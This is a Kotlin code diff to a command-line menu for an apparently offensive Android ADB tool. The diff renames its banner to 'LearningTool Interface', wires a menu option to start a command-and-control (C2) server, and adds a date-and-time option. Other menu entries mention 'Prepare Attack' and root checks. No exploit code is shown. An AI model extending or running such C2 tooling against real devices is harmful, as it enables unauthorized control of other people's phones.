@@ -2,12 +2,13 @@ package Src
 
 import Src.ADB.ADBBase
 import java.util.Scanner
+import java.time.LocalDateTime
 
 fun main() {
     val adb = ADBBase()
     val scanner = Scanner(System.`in`)
 
-    println("--- ADB Interface (Educational Purposes Only) ---")
+    println("--- LearningTool Interface (Educational Purposes Only) ---")
     println("Connected to ADB? ${adb.isAdbAccessible()}")
     println("Device Rooted? ${adb.isDeviceRooted()}")
     println()
@@ -31,6 +32,7 @@ fun main() {
     println("17. Check Device Status")
     println("18. C2 - Start Server (already integrated in Prepare Attack)")
     println("19. C2 - Stop Server")
+    println("20. Display Current Date and Time")
     println("0. Exit")
 
     while (true) {
@@ -177,10 +179,19 @@ fun main() {
                 println("Rooted: ${adb.isDeviceRooted()}")
                 println("--- End of Status ---")
             }
+            "18" -> {
+                println("Starting C2 server...")
+                adb.startC2Server()
+                println("C2 server started.")
+            }
             "19" -> {
                 println("Stopping C2 server...")
                 adb.stopC2Server()
                 println("C2 server stopped.")
+            }
+            "20" -> {
+                val currentDateTime = LocalDateTime.now()
+                println("Current Date and Time: $currentDateTime")
             }
             "0" -> break
             else -> println("Invalid action. Please enter a valid number.")
